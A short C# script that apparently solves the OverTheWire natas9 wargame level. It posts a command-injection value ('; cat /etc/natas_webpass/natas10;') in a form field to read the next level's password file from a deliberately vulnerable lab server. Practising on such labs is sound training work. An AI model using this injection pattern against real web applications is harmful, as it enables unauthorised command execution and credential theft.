using System.Net.Http;
using System.Text;

HttpClient client = new HttpClient();
client.BaseAddress = new Uri("http://natas9.natas.labs.overthewire.org");

//HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Get, "/index.php");
//HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Get, "/index-source.html");
HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Post, "/index.php");

string credential = Convert.ToBase64String(ASCIIEncoding.ASCII.GetBytes("natas9:???????????????????????????????????????"));
request.Headers.Add("Authorization", "Basic " + credential);

string needle = "; cat /etc/natas_webpass/natas10;";

request.Headers.Add("ContentType", "application/x-www-form-urlencoded");
request.Content = new FormUrlEncodedContent(new[] { new KeyValuePair<string, string>("needle", needle), new KeyValuePair<string, string>("submit", "Submit") });


HttpResponseMessage httpResponse = await client.SendAsync(request);
httpResponse.EnsureSuccessStatusCode();
String body = await httpResponse.Content.ReadAsStringAsync();
Console.WriteLine(body) ;
